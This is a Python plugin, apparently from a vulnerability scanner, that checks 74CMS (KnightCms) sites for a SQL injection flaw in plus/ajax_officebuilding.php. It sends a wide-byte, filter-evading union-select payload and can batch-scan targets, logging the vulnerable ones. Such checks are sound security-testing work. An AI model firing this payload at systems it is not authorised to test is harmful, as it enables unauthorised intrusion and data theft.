import requests,re,urllib3
from hashlib import md5
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class KnightCmsSql3:
	def randomInt(self,s,e):
		import random
		key=random.randint(int(s),int(e))
		return key

	def scan(self,baseurl):
		if baseurl[-1]=='/':
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		rand = self.randomInt(200000000, 210000000)
		url=baseurl+"plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5("+str(rand)+"),5,6,7,8,9%23"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if md5(str(rand).encode()).hexdigest() in response.text:
			OutPrintInfo("74CMS", f"存在KnightCms-Sql: {baseurl}")
			if self.batch:
				OutPutFile("74cms_Sqli.txt", f"存在KnightCms-Sql: {baseurl}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在KnightCms-Sql")
	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("74CMS", "开始检测KnightCms-Sql...")
		self.scan(url)
		if not self.batch:
			OutPrintInfo("74CMS", "KnightCms-Sql检测结束")